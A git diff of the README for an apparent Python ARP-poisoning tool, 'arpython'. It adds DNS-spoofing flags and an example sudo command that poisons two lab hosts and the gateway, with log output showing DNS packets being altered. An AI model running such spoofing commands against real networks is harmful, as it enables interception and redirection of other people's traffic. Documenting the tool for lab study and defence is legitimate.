@@ -20,6 +20,10 @@ A help command will come up that will be pretty self explanatory. All possible f
 
 `-a, --arp {s,silent,n,normal,r,restore}` - Use this command to start ARP poisoning. Specify either the silent or non-silent method or the restore method which will restore the ARP tables
 
+`-d, --dns INTERFACE` - Use this command to start DNS poisoning on the given interface, if used without the ARP spoofing it assumes that you have done or are doing that some other way
+
+`-di, dnsip IP` - Use this command to specify a specific IP to DNS spoof
+
 `-p, --packets AMOUNT` - Specify a custom amount of packets for the normal ARP poison attack
 
 `-vi, --victim VICTIM` - Specify the IP address of the victim
@@ -36,9 +40,9 @@ A help command will come up that will be pretty self explanatory. All possible f
 
 `-si, --scaniface IFACE` - Scans a given network interface for active IP and MAC addresses. Just specifying the IP address is enough for this command
 
-`-d, --debug` - Set the logging level to debug
+`-db, --debug` - Set the logging level to debug
 
-`-v, --verbose` - Set the logging level to verbose
+`-vb, --verbose` - Set the logging level to verbose
 
 When the tool is busy it can at any point be interrupted by using `CTRL + C`. All the logging info will also be saved to log.txt where you can see exactly what happened.
 
@@ -86,4 +90,41 @@ sudo python arpython.py -a r -vi 192.168.56.100 -gt 192.168.56.1
 2019-03-31 23:05:54,638 - INFO - Starting ARP Restore
 2019-03-31 23:05:54,640 - INFO - Starting ARP restoration for 192.168.56.100
 2019-03-31 23:05:54,758 - INFO - Restoration successful
+```
+
+#####ARP spoofing two targets and also applying DNS spoofing
+```buildoutcfg
+sudo python arpython.py -a n -vi "192.168.56.101,192.168.56.102" -gt 192.168.56.1 -d enp0s3
+2019-04-08 16:11:48,385 - INFO - Grabbing the victims MAC address(es) since nothing was specified
+2019-04-08 16:11:48,562 - INFO - Grabbing the gateways MAC address since nothing was specified
+2019-04-08 16:11:48,650 - INFO - Starting ARP Poison
+2019-04-08 16:11:48,651 - INFO - Start spoofing network on 192.168.56.101
+2019-04-08 16:11:48,652 - INFO - Start spoofing network on 192.168.56.102
+2019-04-08 16:11:48,652 - INFO - Starting iteration 0 for 192.168.56.101
+2019-04-08 16:11:48,652 - INFO - Starting iteration 0 for 192.168.56.102
+2019-04-08 16:11:48,653 - INFO - Spoofing 192.168.56.102
+2019-04-08 16:11:48,653 - INFO - Spoofing 192.168.56.101
+2019-04-08 16:11:50,654 - INFO - Starting DNS spoofing
+2019-04-08 16:11:50,787 - INFO - Starting iteration 1 for 192.168.56.101
+2019-04-08 16:11:50,787 - INFO - Spoofing 192.168.56.101
+2019-04-08 16:11:50,842 - INFO - Starting iteration 1 for 192.168.56.102
+2019-04-08 16:11:50,843 - INFO - Spoofing 192.168.56.102
+.
+.
+2019-04-08 16:11:55,123 - INFO - Spoofing 192.168.56.102
+2019-04-08 16:11:56,826 - INFO - Packet found. Spoofing DNS packet
+2019-04-08 16:11:56,882 - INFO - Sending altered packet
+2019-04-08 16:11:57,155 - INFO - Starting iteration 4 for 192.168.56.101
+2019-04-08 16:11:57,155 - INFO - Spoofing 192.168.56.101
+2019-04-08 16:11:57,262 - INFO - Starting iteration 4 for 192.168.56.102
+2019-04-08 16:11:57,262 - INFO - Spoofing 192.168.56.102
+.
+.
+2019-04-08 16:12:13,996 - INFO - Done spoofing
+2019-04-08 16:12:14,132 - INFO - Done spoofing
+2019-04-08 16:12:57,453 - INFO - Packet found. Spoofing DNS packet
+2019-04-08 16:12:57,518 - INFO - Sending altered packet
+2019-04-08 16:12:57,518 - INFO - DNS Spoofing stopped
+2019-04-08 16:12:57,518 - INFO - DNS Spoofing stopped
+
 ```
